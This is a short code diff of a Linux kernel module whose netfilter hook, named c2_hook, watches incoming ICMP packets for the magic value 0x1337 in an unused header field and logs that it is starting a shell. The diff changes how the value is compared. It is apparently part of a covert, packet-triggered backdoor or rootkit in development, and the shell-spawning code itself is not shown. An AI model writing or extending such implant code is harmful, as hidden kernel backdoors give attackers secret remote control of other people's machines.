@@ -5,7 +5,6 @@
 #include <linux/netfilter_ipv4.h>
 #include <linux/ip.h>
 #include <linux/icmp.h>
-#include <byteswap.h>
 
 
 MODULE_AUTHOR("Declan Murphy");
@@ -23,12 +22,10 @@ static unsigned int c2_hook(void *priv, struct sk_buff *skb, const struct nf_hoo
     }
 
     else {
-	uint16_t swapped = 0;
 	struct icmphdr *hdr = (struct icmphdr *) (skb->data + sizeof(struct iphdr));
 	uint16_t unused_header = hdr->un.frag.__unused;
-	swapped = __bswap_16(unused_header); //swap endianness over 16 bits
-	printk(KERN_INFO "ICMP UNUSED: %x\n", swapped);
-	if (swapped == 0x1337) {
+	printk(KERN_INFO "ICMP UNUSED: %x\n", unused_header);
+	if (unused_header == 0x1337) {
 	    printk(KERN_INFO "Got ICMP sequence starting shell\n");
 	}
     }
